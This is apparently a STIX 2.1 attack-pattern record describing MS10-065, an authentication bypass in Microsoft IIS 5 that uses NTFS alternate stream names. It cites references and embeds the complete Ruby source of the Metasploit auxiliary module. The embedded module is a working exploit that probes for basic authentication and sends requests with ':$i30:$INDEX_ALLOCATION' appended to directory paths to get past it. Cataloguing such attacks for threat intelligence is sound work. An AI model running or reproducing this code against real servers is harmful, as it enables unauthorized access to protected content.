{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--341cf1f8-25ee-479c-a886-68e9495373c5",
    "created": "2024-08-14T16:23:14.610269Z",
    "modified": "2024-08-14T16:23:14.610273Z",
    "name": "MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass",
    "description": " This module bypasses basic authentication for Internet Information Services (IIS). By appending the NTFS stream name to the directory name in a request, it is possible to bypass authentication.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/iis_auth_bypass.rb",
            "external_id": "iis_auth_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://soroush.secproject.com/blog/2010/07/iis5-1-directory-authentication-bypass-by-using-i30index_allocation/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass',\n        'Description' => %q{\n          This module bypasses basic authentication for Internet Information Services (IIS).\n          By appending the NTFS stream name to the directory name in a request, it is\n          possible to bypass authentication.\n        },\n        'References' => [\n          [ 'CVE', '2010-2731' ],\n          [ 'OSVDB', '66160' ],\n          [ 'MSB', 'MS10-065' ],\n          [ 'URL', 'https://soroush.secproject.com/blog/2010/07/iis5-1-directory-authentication-bypass-by-using-i30index_allocation/' ]\n        ],\n        'Author' => [\n          'Soroush Dalili',\n          'sinn3r'\n        ],\n        'License' => MSF_LICENSE,\n        'DisclosureDate' => '2010-07-02'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI directory where basic auth is enabled', '/'])\n      ]\n    )\n  end\n\n  def has_auth\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'uri' => uri,\n      'method' => 'GET'\n    })\n    vprint_status(res.body) if res\n\n    return (res and res.code == 401)\n  end\n\n  def try_auth\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n    uri << Rex::Text.rand_text_alpha(rand(5..14)) + \".#{Rex::Text.rand_text_alpha(3)}\"\n\n    dir = File.dirname(uri) + ':$i30:$INDEX_ALLOCATION' + '/'\n\n    user = Rex::Text.rand_text_alpha(rand(5..14))\n    pass = Rex::Text.rand_text_alpha(rand(5..14))\n\n    vprint_status(\"Requesting: #{dir}\")\n    res = send_request_cgi({\n      'uri' => dir,\n      'method' => 'GET',\n      'authorization' => basic_auth(user, pass)\n    })\n    vprint_status(res.body) if res\n\n    return (res && (res.code != 401) && (res.code != 404)) ? dir : ''\n  end\n\n  def run\n    if !has_auth\n      print_error('No basic authentication enabled')\n      return\n    end\n\n    bypass_string = try_auth\n\n    if bypass_string.empty?\n      print_error('The bypass attempt did not work')\n    else\n      print_good(\"You can bypass auth by doing: #{bypass_string}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2010-07-02"
}